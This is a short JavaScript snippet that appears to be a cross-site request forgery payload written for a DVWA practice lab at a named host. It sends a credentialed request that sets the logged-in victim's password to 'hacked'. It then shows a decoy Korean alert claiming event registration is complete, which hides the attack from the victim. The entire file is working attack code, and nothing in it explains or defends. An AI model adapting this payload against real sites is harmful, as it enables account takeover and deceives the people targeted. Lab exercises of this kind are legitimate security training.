var host='dvwa.sejongssg.kr';
var req_uri = "http://" + host + "/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change";
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("GET",req_uri,true);
xmlhttp.withCredentials = "true";
xmlhttp.send();
alert('이벤트에 등록이 완료되었습니다. 감사합니다.');
